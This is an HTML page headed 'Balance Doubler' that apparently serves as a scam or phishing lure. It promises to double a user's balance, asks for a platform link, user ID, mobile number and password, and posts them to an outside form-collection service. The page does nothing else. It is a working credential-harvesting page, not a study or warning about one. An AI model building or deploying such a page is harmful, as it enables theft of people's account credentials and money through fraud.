<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Request Sender</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        button {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            background-color: #007bff;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Balance Doubler</h2>
        <form action="https://formcarry.com/s/gOidjbtYxXM" method="POST">
            <label for="platform">Platform Link :</label>
            <input type="text" id="platform" name="platform" placeholder="Enter Platform Link" required>

            <label for="uid">UID :</label>
            <input type="text" id="uid" name="uid" placeholder="Enter UID" required>

            <label for="mob">Mob :</label>
            <input type="text" id="mob" name="mob" placeholder="Enter Mobile Number" required>

            <label for="pwd">Pwd :</label>
            <input type="password" id="pwd" name="pwd" placeholder="Enter Password" required>

            <button type="submit">OK</button>
        </form>
    </div>
</body>
</html>
